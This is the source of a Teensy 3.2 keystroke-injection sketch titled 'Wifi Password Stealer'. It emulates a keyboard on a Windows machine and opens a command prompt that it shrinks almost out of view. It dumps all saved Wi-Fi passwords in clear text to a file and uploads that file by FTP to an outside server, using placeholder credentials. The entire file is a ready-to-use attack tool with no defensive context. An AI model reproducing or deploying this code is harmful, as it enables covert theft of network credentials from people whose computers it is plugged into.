// Teensy 3.2

// **************************************
//
//  Wifi Password Stealer for Teensy 3.2 
//
// **************************************


 void setup()

    {

    delay(5000);

    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);

    Keyboard.set_key1(KEY_R);

    Keyboard.send_now();

    delay(500);

    Keyboard.set_modifier(0);

    Keyboard.set_key1(0);

    Keyboard.send_now();
    

    Keyboard.print("cmd");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(3000);
    Keyboard.print("mode con:cols=14 lines=1");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(3000);
    Keyboard.print("B:");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(3000);
    Keyboard.print("netsh wlan show profile name='*' key=clear > stealer.txt");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();

    delay(3000);
    Keyboard.print("ftp -i ftpserver.com");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(3000);
    Keyboard.print("username");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(3000);
    Keyboard.print("password");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(3000);
    Keyboard.print("cd www");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(3000);
    Keyboard.print("put stealer.txt");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    }

    void loop()

    {

    }
